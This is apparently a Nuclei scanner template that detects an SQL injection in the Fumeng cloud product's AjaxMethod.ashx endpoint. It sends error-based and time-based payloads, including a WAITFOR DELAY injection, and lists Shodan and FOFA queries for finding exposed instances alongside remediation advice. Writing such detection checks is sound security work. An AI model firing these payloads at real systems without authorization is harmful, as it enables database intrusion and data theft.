id: fumengyun-sqli

info:
  name: Fumeng - SQL 注入漏洞
  author: ritikchaddha
  severity: critical
  description: Fumeng - SQL 注入 存在SQL 注入漏洞。攻击者可借助可控参数干预后端 SQL 查询，从而读取敏感数据、绕过鉴权或进一步影响数据库完整性。
  impact: |
    - 攻击者可读取、篡改甚至删除数据库中的敏感数据。
    - 在部分场景下还可能绕过身份验证或进一步扩展为代码执行。
  remediation: |
    - 使用参数化查询或预编译语句，避免将用户输入直接拼接到 SQL 语句中。
    - 对相关接口增加权限校验、输入校验与异常审计，防止敏感查询被滥用。
  reference:
    - https://github.com/emadshanab/goby-poc/blob/main/fumengyun%20%20AjaxMethod.ashx%20SQL%20injection.json
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-score: 0.00076
    epss-percentile: 0.31944
  metadata:
    max-request: 1
    shodan-query: title:"孚盟云 "
    fofa-query: title="孚盟云 "
  tags: time-based-sqli,fumasoft,sqli,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(response, "孚盟")'
        internal: true

  - raw:
      - |
        @timeout: 30s
        GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27 HTTP/1.1
        Host: {{Hostname}}

      - |
        @timeout: 30s
        GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: error-based
        dsl:
          - 'contains_all(response_1, "SELECT count", "System.Exception:", "WHERE upper")'
          - 'status_code_1 == 500'
        condition: and

      - type: dsl
        name: time-based
        dsl:
          - 'duration_2>=6'
          - 'len(body_2) == 1'
          - 'regex("^0$", body_2)'
          - 'contains(content_type_2, "text/plain")'
        condition: and
